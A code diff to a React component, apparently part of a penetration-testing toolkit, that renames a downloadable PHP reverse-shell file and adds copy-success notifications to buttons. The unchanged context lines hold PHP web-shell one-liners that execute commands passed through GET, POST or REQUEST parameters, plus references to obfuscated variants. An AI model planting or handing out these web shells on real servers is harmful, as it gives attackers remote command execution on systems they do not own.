@@ -257,7 +257,7 @@ export default function PhpReverseShell () {
                             type: 'text/plain'
                         } );
                         element.href = URL.createObjectURL( file );
-                        element.download = 'reverseShell.php';
+                        element.download = 'rev.php';
                         document.body.appendChild( element );
                         element.click();
                     }}
@@ -369,7 +369,7 @@ export default function PhpReverseShell () {
                     <DownloadOutlined /> Download
                 </Button>
                 <Clipboard component='a' data-clipboard-text={'<?=`$_GET[0]`?>'}>
-                    <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}>
+                    <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }} onClick={successInfoReverseShell}>
                         <CopyOutlined /> Copy
                     </Button>
                 </Clipboard>
@@ -399,7 +399,7 @@ export default function PhpReverseShell () {
                     <DownloadOutlined /> Download
                 </Button>
                 <Clipboard component='a' data-clipboard-text={'<?=`$_POST[0]`?>'}>
-                    <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}>
+                    <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }} onClick={successInfoReverseShell}>
                         <CopyOutlined /> Copy
                     </Button>
                 </Clipboard>
@@ -431,7 +431,7 @@ export default function PhpReverseShell () {
                     <DownloadOutlined /> Download
                 </Button>
                 <Clipboard component='a' data-clipboard-text={"<?=`{$_REQUEST['_']}`?>"}>
-                    <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}>
+                    <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }} onClick={successInfoReverseShell}>
                         <CopyOutlined /> Copy
                     </Button>
                 </Clipboard>
@@ -462,7 +462,7 @@ export default function PhpReverseShell () {
                     <DownloadOutlined /> Download
                 </Button>
                 <Clipboard component='a' data-clipboard-text={shell_obfuscate}>
-                    <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}>
+                    <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }} onClick={successInfoReverseShell}>
                         <CopyOutlined /> Copy
                     </Button>
                 </Clipboard>
@@ -494,7 +494,7 @@ export default function PhpReverseShell () {
                     <DownloadOutlined /> Download
                 </Button>
                 <Clipboard component='a' data-clipboard-text={shell_obfuscate_function}>
-                    <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}>
+                    <Button type='dashed' style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }} onClick={successInfoReverseShell}>
                         <CopyOutlined /> Copy
                     </Button>
                 </Clipboard>
